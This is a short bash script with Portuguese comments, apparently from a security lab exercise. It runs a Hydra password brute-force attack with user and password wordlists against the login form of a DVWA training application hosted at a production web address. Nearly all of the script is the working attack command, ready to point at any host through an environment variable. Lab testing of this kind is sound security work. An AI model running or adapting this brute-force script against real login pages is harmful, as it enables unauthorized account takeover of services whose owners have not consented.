#!/bin/bash

# Play 02 — Hydra DVWA em produção
# Usa variável DVWA_HOST ou default (sem incluir :80 no TARGET)

TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Iniciando ataque com Hydra contra $TARGET:80..."

# Hydra com -s 80 para especificar porta, evitando ambiguidade no parser
hydra -s 80 -L users.txt -P passwords.txt \
  "http-post-form://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login failed" \
  -o hydra-out.txt 2>&1

echo "[✔️] Teste concluído com sucesso."
